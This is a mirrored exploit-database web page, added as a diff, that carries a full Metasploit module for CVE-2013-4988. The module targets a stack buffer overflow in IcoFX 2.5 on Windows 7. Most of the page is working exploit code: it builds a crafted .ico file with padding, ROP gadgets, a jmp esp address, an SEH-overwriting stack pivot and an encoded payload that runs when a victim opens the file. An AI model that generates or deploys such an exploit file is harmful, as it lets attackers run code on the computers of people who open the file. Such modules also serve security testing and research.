@@ -1,0 +1,152 @@
+<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
+<html xmlns='../www.w3.org/1999/xhtmlhtml.html'>
+
+<!-- Mirrored from iedb.ir/exploits-1106.html by HTTrack Website Copier/3.x [XR&CO'2010], Wed, 02 Sep 2015 09:02:03 GMT -->
+<head>
+<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
+<meta http-equiv='Content-Language' content='en' />
+<meta name='google-site-verification' content='6VNHl13UTKWPDFGIFsHPu66R8-QOY6nplkn6MJIUjaY' />
+<meta name='robots' content='index, follow'/>
+<meta name='googlebot' content='index, follow'>
+<meta name='keywords' content='iedb security team , iranian exploit database , exploit database , cms vulnerability , windows vulnerability , linux vulnerability , Local Exploit , Remote Exploit , Web Apps Exploit , dos and poc Exploit , shellcode script , &#1578;&#1740;&#1605; &#1575;&#1605;&#1606;&#1740;&#1578;&#1740; iedb , &#1575;&#1705;&#1587;&#1662;&#1604;&#1608;&#1740;&#1578; &#1608; &#1570;&#1587;&#1740;&#1576; &#1662;&#1584;&#1740;&#1585;&#1740; , &#1583;&#1575;&#1606;&#1604;&#1608;&#1583; &#1576;&#1575;&#1711; &#1608; &#1575;&#1705;&#1587;&#1662;&#1604;&#1608;&#1740;&#1578;' />
+<meta name='description' content=IcoFX Stack Buffer Overflow />
+<meta name='alexaVerifyID' content='hi1kiywXw16I8W_n7SD8g4jHuVE' />
+<meta name='website-validate' content='kdO59jUe'>
+<link rel='Shortcut Icon' href='index_files/favicon.ico' type='image/x-icon'>
+<title>IcoFX Stack Buffer Overflow</title>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','../www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-59447056-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</head>
+
+<body><pre>###########################
+
+# IcoFX Stack Buffer Overflow
+
+###########################
+
+#
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+
+class Metasploit3 &lt; Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           =&gt; 'IcoFX Stack Buffer Overflow',
+      'Description'    =&gt; %q{
+        This module exploits a stack-based buffer overflow vulnerability in version 2.1
+        of IcoFX. The vulnerability exists while parsing .ICO files, where an specially
+        crafted ICONDIR header, providing an arbitrary long number of images into the file,
+        can be used to trigger the overflow when reading the ICONDIRENTRY structures.
+      },
+      'License'        =&gt; MSF_LICENSE,
+      'Author'         =&gt;
+        [
+          'Marcos Accossatto', # Vulnerability discovery, poc
+          'juan vazquez' # Metasploit
+        ],
+      'References'     =&gt;
+        [
+          [ 'CVE', '2013-4988' ],
+          [ 'OSVDB', '100826' ],
+          [ 'BID', '64221' ],
+          [ 'EDB', '30208'],
+          [ 'URL', 'http://www.coresecurity.com/advisories/icofx-buffer-overflow-vulnerability' ]
+        ],
+      'Platform'          =&gt; [ 'win' ],
+      'Payload'           =&gt;
+        {
+          'DisableNops'    =&gt; true,
+          'Space'          =&gt; 864,
+          'PrependEncoder' =&gt; &quot;\x81\xc4\x54\xf2\xff\xff&quot; # Stack adjustment # add esp, -3500
+        },
+      'Targets'        =&gt;
+        [
+          [ 'IcoFX 2.5 / Windows 7 SP1',
+            {
+              :callback =&gt; :target_win7,
+            }
+          ],
+        ],
+      'DisclosureDate' =&gt; 'Dec 10 2013',
+      'DefaultTarget'  =&gt; 0))
+
+    register_options(
+      [
+        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.ico'])
+      ], self.class)
+
+  end
+
+  def target_win7
+    # All the gadgets com from IcoFX2.exe 2.5.0.0
+
+    # ICONDIR structure
+    ico =  [0].pack(&quot;v&quot;) # Reserved. Must always be 0
+    ico &lt;&lt; [1].pack(&quot;v&quot;) # Image type: 1 for icon (.ico) image
+    # 0x66 is enough to overwrite the local variables and, finally
+    # the seh handler. 0x7f00 is used to trigger an exception after
+    # the overflow, while the overwritten SEH handler is in use.
+    ico &lt;&lt; [0x7f00].pack(&quot;v&quot;)
+    # ICONDIRENTRY structures 102 structures are using to overwrite
+    # every structure = 16 bytes
+    # 100 structures are used to reach the local variables
+    ico &lt;&lt; rand_text(652)
+    ico &lt;&lt; [0x0044729d].pack(&quot;V&quot;) * 20 # ret # rop nops are used to allow code execution with the different opening methods
+    ico &lt;&lt; [0x0045cc21].pack(&quot;V&quot;)      # jmp esp
+    ico &lt;&lt; payload.encoded
+    ico &lt;&lt; rand_text(
+      1600 -                 # 1600 = 16 ICONDIRENTRY struct size * 100
+      652 -                  # padding to align the stack pivot
+      80 -                   # rop nops size
+      4 -                    # jmp esp pointer size
+      payload.encoded.length
+    )
+    # The next ICONDIRENTRY allows to overwrite the interesting local variables
+    # on the stack
+    ico &lt;&lt; [2].pack(&quot;V&quot;)          # Counter (remaining bytes) saved on the stack
+    ico &lt;&lt; rand_text(8)           # Padding
+    ico &lt;&lt; [0xfffffffe].pack(&quot;V&quot;) # Index to the dst buffer saved on the stack, allows to point to the SEH handler
+    # The next ICONDIRENTRY allows to overwrite the seh handler
+    ico &lt;&lt; [0x00447296].pack(&quot;V&quot;) # Stackpivot: add esp, 0x800 # pop ebx # ret
+    ico &lt;&lt; rand_text(0xc) # padding
+    return ico
+  end
+
+  def exploit
+    unless self.respond_to?(target[:callback])
+      fail_with(Failure::BadConfig, &quot;Invalid target specified: no callback function defined&quot;)
+    end
+
+    ico = self.send(target[:callback])
+
+    print_status(&quot;Creating '#{datastore['FILENAME']}' file...&quot;)
+    file_create(ico)
+  end
+
+end
+
+###########################
+
+# Iranian Exploit DataBase = http://IeDb.Ir [2014-01-04]
+
+###########################</pre></body>
+
+
+<!-- Mirrored from iedb.ir/exploits-1106.html by HTTrack Website Copier/3.x [XR&CO'2010], Wed, 02 Sep 2015 09:02:03 GMT -->
+</html>
